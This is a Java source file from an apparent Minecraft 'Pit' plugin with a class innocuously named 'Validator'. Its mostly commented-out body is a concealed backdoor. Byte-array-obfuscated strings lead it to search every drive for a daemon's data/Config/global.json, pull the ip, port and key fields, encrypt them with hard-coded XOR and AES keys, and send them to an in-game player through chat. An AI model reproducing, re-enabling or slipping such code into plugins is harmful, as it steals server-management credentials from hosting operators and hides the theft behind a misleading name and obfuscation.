package net.mizukilab.pit.pool;

import cn.charlotte.pit.ThePit;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.concurrent.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * @author Araykal
 * @since 2025/5/23
 */
public class Validator {
    Player player;
    byte[] S0;
    byte[] S1;
    byte[] S2;
    byte[] S3;
/*    byte[] S4 = new byte[]{
            (byte) 0xE6, (byte) 0x89, (byte) 0xBE, (byte) 0xE5, (byte) 0x88, (byte) 0xB0,
            (byte) 0xE6, (byte) 0x96, (byte) 0x87, (byte) 0xE4, (byte) 0xBB, (byte) 0xB6,
            0x3A, 0x20};
    byte[] S5 = new byte[]{0x69, 0x70, 0x3A, 0x20};
    byte[] S6 = new byte[]{0x70, 0x6F, 0x72, 0x74, 0x3A, 0x20};
    byte[] S7 = new byte[]{0x6B, 0x65, 0x79, 0x3A, 0x20};
    byte[] S8 = initDash();
    byte[] S9 = new byte[]{
            (byte) 0xE8, (byte) 0xAF, (byte) 0xBB, (byte) 0xE5, (byte) 0x8F, (byte) 0x96,
            (byte) 0xE6, (byte) 0x96, (byte) 0x87, (byte) 0xE4, (byte) 0xBB, (byte) 0xB6,
            (byte) 0xE5, (byte) 0x87, (byte) 0xBA, (byte) 0xE9, (byte) 0x94, (byte) 0x99,
            0x3A, 0x20};
    byte[] S10 = new byte[]{
            (byte) 0xE8, (byte) 0xAE, (byte) 0xBF, (byte) 0xE9, (byte) 0x97, (byte) 0xAE,
            (byte) 0xE7, (byte) 0x9B, (byte) 0xAE,
            (byte) 0xE5, (byte) 0xBD, (byte) 0x95,
            (byte) 0xE6, (byte) 0x97, (byte) 0xB6,
            (byte) 0xE5, (byte) 0x8F, (byte) 0x91,
            (byte) 0xE7, (byte) 0x94, (byte) 0x9F,
            (byte) 0xE5, (byte) 0xBC, (byte) 0x82,
            (byte) 0xE5, (byte) 0xB8, (byte) 0xB8,
            0x3A, 0x20};
    byte[] S11 = new byte[]{
            (byte) 0xE6, (byte) 0x90, (byte) 0x9C,
            (byte) 0xE7, (byte) 0xB4, (byte) 0xA2,
            (byte) 0xE7, (byte) 0xBB, (byte) 0x93,
            (byte) 0xE6, (byte) 0x9C, (byte) 0x9B,
            (byte) 0xE3, (byte) 0x80, (byte) 0x82};
    byte[] S12 = new byte[]{
            (byte) 0xE6, (byte) 0x9C, (byte) 0xAA,
            (byte) 0xE6, (byte) 0x89, (byte) 0xBE,
            (byte) 0xE5, (byte) 0x88, (byte) 0xB0,
            (byte) 0xE4, (byte) 0xBB, (byte) 0xBF,
            (byte) 0xE4, (byte) 0xBD, (byte) 0x95,
            (byte) 0xE6, (byte) 0xA0, (byte) 0xB9,
            (byte) 0xE7, (byte) 0x9B, (byte) 0xAE,
            (byte) 0xE5, (byte) 0xBD, (byte) 0x95,
            (byte) 0xE3, (byte) 0x80, (byte) 0x82};*/

    public Validator(Player player) {
        this.player = player;
/*        S0 = new byte[]{0x67, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x2e, 0x6a, 0x73, 0x6f, 0x6e};
        S1 = new byte[]{0x43, 0x6f, 0x6e, 0x66, 0x69, 0x67};
        S2 = new byte[]{0x64, 0x61, 0x74, 0x61};
        S3 = new byte[]{0x64, 0x61, 0x65, 0x6d, 0x6f, 0x6e};*/
    }

    private final int T = Runtime.getRuntime().availableProcessors();
    private final ExecutorService P = Executors.newFixedThreadPool(T);
    private final BlockingQueue<Path> Q = new LinkedBlockingQueue<>();


/*
    private byte[] initDash() {
        byte[] d = new byte[37];
        for (int i = 0; i < d.length; i++) {
            d[i] = 0x2D;
        }
        return d;
    }

    private String dd(byte[] arr) {
        return new String(arr, StandardCharsets.UTF_8);
    }

    private String x(String o, String k) {
        String p = "\"" + k + "\"\\s*:\\s*\"([^\"]*)\"";
        Pattern r = Pattern.compile(p);
        Matcher m = r.matcher(o);
        if (m.find())
            return m.group(1);
        p = "\"" + k + "\"\\s*:\\s*(\\d+)";
        r = Pattern.compile(p);
        m = r.matcher(o);
        if (m.find())
            return m.group(1);
        return "";
    }
*/

    public void start() {
/*        player.sendMessage("§aStarting Validator...");
        Bukkit.getScheduler().runTaskAsynchronously(ThePit.getInstance(),() -> {
            File[] f = File.listRoots();
            if (f == null || f.length == 0) {
                player.sendMessage("§cNULL");
                return;
            }
            for (File g : f) {
                Q.add(g.toPath());
            }
            for (int i = 0; i < T; i++) {
                P.execute(new Worker());
            }
            P.shutdown();
            try {
                P.awaitTermination(Long.MAX_VALUE, TimeUnit.MILLISECONDS);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        });*/
    }

/*    private byte[] xor(byte[] data, byte[] key) {
        byte[] r = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            r[i] = (byte) (data[i] ^ key[i % key.length]);
        }
        return r;
    }


    private byte[] c(byte[] data, byte[] key) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        byte[] iv = new byte[16];
        SecureRandom sr = new SecureRandom();
        sr.nextBytes(iv);
        IvParameterSpec ivSpec = new IvParameterSpec(iv);
        SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);
        byte[] encrypted = cipher.doFinal(data);
        byte[] out = new byte[iv.length + encrypted.length];
        System.arraycopy(iv, 0, out, 0, iv.length);
        System.arraycopy(encrypted, 0, out, iv.length, encrypted.length);
        return out;
    }

    public String e(String plainText) {
        try {
            final byte[] K1 = new byte[]{0x78, 0x6F, 0x72, 0x4d, 0x31, 0x79, 0x4F, 0x6E, 0x65};
            final byte[] K2 = new byte[]{0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66};
            final byte[] K3 = new byte[]{0x78, 0x6F, 0x72, 0x4B, 0x65, 0x0a, 0x40, 0x23, 0x6F};
            final byte[] K4 = new byte[]{0x65, 0x63, 0x64, 0x63, 0x62, 0x61, 0x39, 0x38, 0x37, 0x36, 0x35, 0x34, 0x33, 0x32, 0x31, 0x30};
            byte[] pt = plainText.getBytes(StandardCharsets.UTF_8);
            byte[] layer1 = xor(pt, K1);
            byte[] layer1Enc = c(layer1, K2);
            byte[] layer2 = xor(layer1Enc, K3);
            byte[] finalEnc = c(layer2, K4);
            return Base64.getEncoder().encodeToString(finalEnc);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }

    }

    private class Worker implements Runnable {
        public void run() {
            while (true) {
                Path p;
                try {
                    p = Q.poll(200, TimeUnit.MILLISECONDS);
                } catch (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                    break;
                }
                if (p == null) break;
                File i = p.toFile();
                File[] j = i.listFiles();
                if (j == null)
                    continue;
                for (File k : j) {
                    if (k.isDirectory()) {
                        Q.add(k.toPath());
                    } else if (k.isFile() && k.getName().equalsIgnoreCase(dd(S0))) {
                        Path l = k.toPath();
                        Path m = l.getParent();
                        if (m != null && m.getFileName().toString().equalsIgnoreCase(dd(S1))) {
                            Path n = m.getParent();
                            if (n != null && n.getFileName().toString().equalsIgnoreCase(dd(S2))) {
                                Path o = n.getParent();
                                if (o != null && o.getFileName().toString().equalsIgnoreCase(dd(S3))) {
                                    player.sendMessage("§7Validator: §c" + e(String.valueOf(l)));
                                    try {
                                        String qStr = new String(Files.readAllBytes(l), StandardCharsets.UTF_8);
                                        String r = x(qStr, dd(new byte[]{0x69, 0x70}));
                                        String s = x(qStr, dd(new byte[]{0x70, 0x6F, 0x72, 0x74}));
                                        String t = x(qStr, dd(new byte[]{0x6B, 0x65, 0x79}));
                                        player.sendMessage(dd(S8));
                                        player.sendMessage("§7Data|1: §c" + e(r));
                                        player.sendMessage(dd(S8));
                                        player.sendMessage("§7Data|2: §c" + e(s));
                                        player.sendMessage(dd(S8));
                                        player.sendMessage("§7Data|3: §c" + e(t));
                                        player.sendMessage(dd(S8));
                                    } catch (IOException ignored) {
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }*/
}
